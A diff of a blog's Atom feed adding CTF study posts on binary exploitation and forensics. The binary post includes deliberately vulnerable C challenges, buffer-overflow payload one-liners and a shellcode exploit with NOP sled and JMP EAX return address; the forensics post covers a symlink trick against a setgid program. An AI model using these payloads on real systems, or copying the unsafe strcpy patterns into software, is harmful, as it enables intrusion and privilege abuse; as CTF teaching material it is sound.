@@ -4,7 +4,7 @@
   <title><![CDATA[tech.bitvijays.com]]></title>
   <link href="http://bitvijays.github.io/atom.xml" rel="self"/>
   <link href="http://bitvijays.github.io/"/>
-  <updated>2014-11-06T18:43:55+00:00</updated>
+  <updated>2014-11-30T11:16:29+00:00</updated>
   <id>http://bitvijays.github.io/</id>
   <author>
     <name><![CDATA[Vijay Kumar]]></name>
@@ -12,6 +12,632 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Learning From CTF: Binary Exploitation]]></title>
+    <link href="http://bitvijays.github.io/blog/2014/11/09/learning-from-ctf-binary-exploitation/"/>
+    <updated>2014-11-09T20:42:01+00:00</updated>
+    <id>http://bitvijays.github.io/blog/2014/11/09/learning-from-ctf-binary-exploitation</id>
+    <content type="html"><![CDATA[<p>This post (Work in Progress) lists the tips and tricks while doing Binary Exploitation challenges during various CTF&rsquo;s.</p>
+
+<!-- more -->
+
+
+
+
+<ol>
+<li>
+Big-endian systems store the most significant byte of a word in the smallest address and the least significant byte is stored in the largest address. Little-endian systems, in contrast, store the least significant byte in the smallest address.
+<br>
+<img class="left" src="http://bitvijays.github.io/images/big-endian.png" width="250" height="250">
+<img class="right" src="http://bitvijays.github.io/images/little-endian.png" width="250" height="250">
+</li>
+<br><br><br><br><br><br><br><br><br>
+<li>When you get a binary for exploitation, we need to find whether it is 32-bit or 64-bit ELF, which platform it is running, whether any buffer overflow prevention techniques has been used, what is EIP offset.
+<ul>
+<li>Executable binary is running on whether x86 or x86-64. (uname -a)</li>
+<li>Whether the binary is compiled for 32 bit or 64 bit (file binary_file)</li>
+<li>Buffer overflow prevention techniques such as RELRO, NoExecute (NX), Stack Canaries, Address Space Layout Randomization (ASLR) and Position Independent Executables (PIE) can be found by running <a href="http://www.trapkit.de/tools/checksec.html">Checksec Script</a>. This script is present in <a href="https://github.com/longld/peda">gdb-peda</a>.</li>
+<li>Whether the stack of binary is executable is not can be found by readelf tool. IF Program header GNU_STACK has RWE flag, if it has E flag, it&#8217;s executable.</li>
+</ul>
+</li>
+
+<li>Sometimes, you need to know the address of the variable, inorder to write arbitary value in to it. run gdb <program>, p &<variablename>. For example, below you need the address of secret to write the new value 0x1337beef.
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="kt">unsigned</span> <span class="n">secret</span> <span class="o">=</span> <span class="mh">0xdeadbeef</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
+</span><span class='line'>    <span class="kt">unsigned</span> <span class="o">*</span><span class="n">ptr</span><span class="p">;</span>
+</span><span class='line'>    <span class="kt">unsigned</span> <span class="n">value</span><span class="p">;</span>
+</span><span class='line'>    <span class="kt">char</span> <span class="n">key</span><span class="p">[</span><span class="mi">33</span><span class="p">];</span>
+</span><span class='line'>    <span class="kt">FILE</span> <span class="o">*</span><span class="n">f</span><span class="p">;</span>
+</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Welcome! I will grant you one arbitrary write!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Where do you want to write to? &quot;</span><span class="p">);</span>
+</span><span class='line'>    <span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%p&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ptr</span><span class="p">);</span>
+</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Okay! What do you want to write there? &quot;</span><span class="p">);</span>
+</span><span class='line'>    <span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%p&quot;</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">value</span><span class="p">);</span>
+</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Writing %p to %p...</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">value</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr</span><span class="p">);</span>
+</span><span class='line'>    <span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">value</span><span class="p">;</span>
+</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Value written!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">secret</span> <span class="o">==</span> <span class="mh">0x1337beef</span><span class="p">){</span>
+</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Woah! You changed my secret!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;I guess this means you get a flag now...</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="n">f</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&quot;flag.txt&quot;</span><span class="p">,</span> <span class="s">&quot;r&quot;</span><span class="p">);</span>
+</span><span class='line'>        <span class="n">fgets</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="n">f</span><span class="p">);</span>
+</span><span class='line'>        <span class="n">fclose</span><span class="p">(</span><span class="n">f</span><span class="p">);</span>
+</span><span class='line'>        <span class="n">puts</span><span class="p">(</span><span class="n">key</span><span class="p">);</span>
+</span><span class='line'>        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;My secret is still safe! Sorry.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure></li>
+
+<li>In another challenge below, It can be easily seen the value of secret can be changed after entering 16 characters + 0xc0deface. As, 0xc0deface can&#8217;t be printed as ASCII characters, you can use python to pass the input.
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="err">&#39;</span> <span class="n">print</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">16</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\xc0\xde\xfa\xce</span><span class="s">&quot;</span><span class="err">&#39;</span> <span class="n">or</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="err">&#39;</span> <span class="n">print</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">16</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\xce\xfa\xde\xc0</span><span class="s">&quot;</span><span class="err">&#39;</span> <span class="n">based</span> <span class="n">on</span> <span class="n">the</span> <span class="n">endianess</span> <span class="n">of</span> <span class="n">the</span> <span class="n">system</span><span class="p">.</span>
+</span></code></pre></td></tr></table></div></figure>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="kt">void</span> <span class="nf">give_shell</span><span class="p">(){</span>
+</span><span class='line'>    <span class="kt">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
+</span><span class='line'>    <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
+</span><span class='line'>    <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh -i&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">void</span> <span class="nf">vuln</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">input</span><span class="p">){</span>
+</span><span class='line'>    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+</span><span class='line'>    <span class="kt">int</span> <span class="n">secret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>    <span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">input</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">secret</span> <span class="o">==</span> <span class="mh">0xc0deface</span><span class="p">){</span>
+</span><span class='line'>        <span class="n">give_shell</span><span class="p">();</span>
+</span><span class='line'>    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;The secret is %x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">secret</span><span class="p">);</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
+</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span>
+</span><span class='line'>        <span class="n">vuln</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure></li>
+
+<li>Controlling the EIP:
+In the below challenge, an attacker can use a buffer overflow to take control of the program&#8217;s execution. the return address for the call to vuln function is above buf on the stack, so it can be overwritten with an overflow. this allows an attacker to put nearly any address they desire in place of the return address. in this example, the goal is to call the give_shell function.
+<ul>
+<li>We need to find the address of give_shell function which can be done either by using gdb and print give_shell or objdump -d outputfile | grep give_shell.</li>
+<li>To know the EIP offset, you can use cyclic patterns. Use  pattern_create.rb and pattern_offset.rb So pattern_create.rb 100 for instance will create a 100 byte cyclic pattern.</li>
+<li>then you feed this as your input to the vulnerable program and it wil crash. so get the value of EIP at that point.</li>
+<li>Then, we just need to pass the input to the program by ./a.out $(python -c &#8217; print &#8220;A&#8221; * Offset + &#8220;Address of give_shell in hex&#8221;&#8217; )</li>
+</ul>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="cm">/* This never gets called! */</span>
+</span><span class='line'><span class="kt">void</span> <span class="nf">give_shell</span><span class="p">(){</span>
+</span><span class='line'>    <span class="kt">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
+</span><span class='line'>    <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
+</span><span class='line'>    <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh -i&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">void</span> <span class="nf">vuln</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">input</span><span class="p">){</span>
+</span><span class='line'>    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+</span><span class='line'>    <span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">input</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
+</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span>
+</span><span class='line'>        <span class="n">vuln</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure></li>
+
+<li> Execute Me:
+If you check the below code, getegid() function shall return the effective group ID of the calling process., setresuid() sets the real user ID, the effective user ID, and the saved set-user-ID of the calling process.
+
+If you see, read function read the stdin into the buffer and (function_ptf) buf() function is called which would call anything in the buffer.
+<ul>
+<li>We should first check that executable binary is running on whether x86 or x86-64. (uname - a)</li>
+<li>Then, we should check whether the binary is compiled for 32 bit or 64 bit (file <binary file>)</li>
+<li>Since, buf will execute anything, we need a shell code to fit in 128 bytes, There are plenty of shellcode (with different platforms and different working)which can be found on <a href="http://shell-storm.org/shellcode/">Shell-Storm</a>.</li>
+<li>Then, we just need to pass the input to the program by ./a.out $(python -c &#8217; print &#8220;A&#8221; * Offset + &#8220;Address of give_shell in hex&#8221;&#8217; )</li>
+</ul>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="n">token</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">typedef</span> <span class="nf">void</span> <span class="p">(</span><span class="o">*</span><span class="n">function_ptr</span><span class="p">)();</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">void</span> <span class="nf">be_nice_to_people</span><span class="p">(){</span>
+</span><span class='line'>    <span class="kt">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
+</span><span class='line'>    <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
+</span><span class='line'>    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">be_nice_to_people</span><span class="p">();</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">128</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="p">((</span><span class="n">function_ptr</span><span class="p">)</span><span class="n">buf</span><span class="p">)();</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure></li>
+
+
+<li> ROP1: This binary is running on a machine with ASLR! (Address space layout randomization (ASLR) is a computer security technique involved in protection from buffer overflow attacks.) Can you bypass it?
+
+<ul>
+<li>
+From the code provided we can see that there’s a buffer overflow in the vuln() function due to the strcpy() call.  run the program within gdb and see what the state of the registers and the stack are at the time of the crash.
+</li>
+<li>From the cylic patterns tools, we could find that offset is at 76 which could be confirmed by providing a input of 76 “A”s and 4 “B”s to overwrite EIP. set a breakpoint after the call to strcpy(); that is *vuln+24. After the leave instruction is executed, EIP will be set to 0x424242.</li>
+<li>EAX points to our buffer of “A”s and since the binary doesn’t have the NX bit, we can execute shellcode on the stack. To bypass ASLR, we just need to find an address that will do a JMP/CALL EAX and set that as our return address. msfelfscan can find a list of instructions to accomplish this:
+</li>
+<li>Since the binary is compiled for 32 bit, searching the shellcode in Shellstorm for Linux_x86 executing /bin/sh, we get 21 bytes shellcode by kernelpanic.</li>
+<li> As EAX contains the 76*A + BBBB when the vuln function returns, we just need to find address which will execute JMP EAX, it can be found by msfelfscan -j eax binary_file</li>
+<li>One more small but important observation is the number of NOPs, as our shellcode is 21 bytes and offset is 76 bytes and jmp is 4 bytes. So, 76 - 21 - 4 = 51.</li>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='Python'><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
+</span><span class='line'><span class="n">code</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80</span><span class="s">&quot;</span>
+</span><span class='line'><span class="n">jmpeax</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;I&quot;</span><span class="p">,</span><span class="mh">0x080483e7</span><span class="p">)</span>
+</span><span class='line'><span class="k">print</span> <span class="s">&quot;</span><span class="se">\x90</span><span class="s">&quot;</span><span class="o">*</span><span class="mi">51</span> <span class="o">+</span> <span class="n">code</span> <span class="o">+</span> <span class="n">jmpeax</span>
+</span></code></pre></td></tr></table></div></figure>
+</ul>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">void</span> <span class="nf">be_nice_to_people</span><span class="p">(){</span>
+</span><span class='line'>    <span class="kt">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
+</span><span class='line'>    <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">void</span> <span class="nf">vuln</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">){</span>
+</span><span class='line'>    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+</span><span class='line'>    <span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
+</span><span class='line'>    <span class="n">be_nice_to_people</span><span class="p">();</span>
+</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span>
+</span><span class='line'>        <span class="n">vuln</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure></li>
+</ol>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Learning From CTF: Forensics]]></title>
+    <link href="http://bitvijays.github.io/blog/2014/11/07/learning-from-ctf-forensics/"/>
+    <updated>2014-11-07T22:07:09+00:00</updated>
+    <id>http://bitvijays.github.io/blog/2014/11/07/learning-from-ctf-forensics</id>
+    <content type="html"><![CDATA[<p>This post (Work in Progress) lists the tips and tricks while doing Forensics challenges during various CTF&rsquo;s.</p>
+
+<!-- more -->
+
+
+<ol>
+<li>If you are provided a <strong>jar</strong> file in the challenge, JAR (Java ARchive) is a package file format typically used to aggregate many Java class files and associated metadata and resources (text, images, etc.) into one file to distribute application software or libraries on the Java platform. It can be extracted using 
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>jar xf jar-file
+</span><span class='line'>
+</span><span class='line'>x : extract files from the JAR archive.
+</span><span class='line'>f : JAR file from which files are to be extracted is specified on the command line, rather than through stdin.
+</span><span class='line'>The jar-file argument is the filename (or path and filename) of the JAR file from which to extract files.</span></code></pre></td></tr></table></div></figure>
+</li>
+
+<li>Wireshark - Searching for answers in pcap file? 
+<ul>
+<li>Searching passwords in HTTP Web traffic in wireshark? http.request.method == &#8220;POST&#8221; filter might help, based on concept that server is asking for LOGIN prompt and user is POSTing his password in cleartext.</li>
+<li>If the challenge says IP address has been spoofed, then you should look for MAC address as it wouldn&#8217;t have changed. You would find packets with two different IP address having same MAC address. In another scenario, if the MAC address has been spoofed, IP address might be the same. In both cases display filter &#8220;arp&#8221; (to only show arp requests) and &#8220;ip.addr==<IP address>&#8221; (to show only packets with either source or destination being the IP address). might be helpful.</li>
+<li>Sometimes, it is better to check which objects we are able to export, (File &#8211;> Export Objects &#8211;> HTTP/DICOM/SMB/SMB2) export the http/DICOM/SMB/SMB2 object </li>
+<li>Sometimes, you need to find all the unique ip address in the network capture, for that you can use 
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>tshark -T fields -e ip.src -r &lt; pcap file&gt; | sort | uniq
+</span><span class='line'>
+</span><span class='line'>-T             : Set the format of the output when viewing decoded packet data.
+</span><span class='line'>-e &lt;field&gt;     : Add a field to the list of fields to display if -T fields is selected.
+</span><span class='line'>-r &lt;pcap file&gt; : Read packet data from infile, can be any supported capture file format (including gzipped files). </span></code></pre></td></tr></table></div></figure></li>
+</ul>
+</li>
+<br>
+<li>If in a challenge, you are provided a setgid program which is able to read a certain extension files and flag is present in some other extension, create a symbolic link to the flag with the extension which can be read by the program. For example: In picoCTF 2014 Supercow challenge, a program named supercow was able to read files with .cow extension only and flag was present with flag.txt. So we created a symbolic link like ln -s flag.txt flag.cow</li>
+<br>
+<li>If in a challenge, you are provided with a <b>APK</b> file. There are three ways to decompile it as described below:
+<ul>
+<li>Apktool:
+It is used to decode resources to nearly original form (including resources.arsc, XMLs and 9.png files) and rebuilding them. Also, used for smali debugging.
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>apktool d file.apk output-dir
+</span><span class='line'>d : decode to output-dir</span></code></pre></td></tr></table></div></figure>
+apktool converts the apk file in to smali format. smali/baksmali is an assembler/disassembler for the dex format used by dalvik, Android&#8217;s Java VM implementation.
+</li>
+<li>Dex2jar: To see the java code (approx)
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>1. Change the extension of file.apk from .apk to .zip
+</span><span class='line'>2. Unzip the file.zip 
+</span><span class='line'>3. After unzip, you would get classes.dex file.
+</span><span class='line'>4. Use dex2jar classes.dex (It would create classes_dex2jar.jar file)
+</span><span class='line'>5. Extract jar file by jar xf classes_dex2jar.jar
+</span><span class='line'>6. This would provide you with .class files which could be open by jd-gui (Java Decompiler) tool. </span></code></pre></td></tr></table></div></figure>
+</li>
+
+<li>Use online services such as [http://www.decompileandroid.com/](http://www.decompileandroid.com). Once it&#8217;s decompiled, we can download the decompiled files and unpack them. </li>
+
+</ul>
+</li>
+<br>
+<li>If you are provided a <b>disk.img</b> file, from which files have to recovered, you could use foremost tool used to recover files using their headers, footers, and data structures.</li>
+<br>
+<li>If you are having a source code of evil program, check the source code of the real program, do a comparision and find the added evil code.</li>
+<br>
+<li>If you are looking for <b>hidden flag in an image</b> first check with file, exiftool command, and make sure the extension is correctly displayed. After that check the image file with hexdump -C and look for interesting pattern may be? If you get 7z or PK they represent Zipped files. If so, you can extract those file with 7z x <image_file>. If somehow, you get a passphrase for the image, then you might have to use steghide tool as it allows to hide data with a passphrase.</li>
+<br>
+<li>Sometimes, if you extract some files, if you wuld see a blank name, you know there is some file but can&#8217;t see a name, like file name could be spaces?, then 
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ls -lb might be of help.
+</span><span class='line'>-b, --escape :   print C-style escapes for nongraphic characters
+</span></code></pre></td></tr></table></div></figure> </li>
+
+
+</ol>
+
+
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Learning From CTF: Cryptography]]></title>
+    <link href="http://bitvijays.github.io/blog/2014/11/07/learning-from-ctf-cryptography/"/>
+    <updated>2014-11-07T19:25:31+00:00</updated>
+    <id>http://bitvijays.github.io/blog/2014/11/07/learning-from-ctf-cryptography</id>
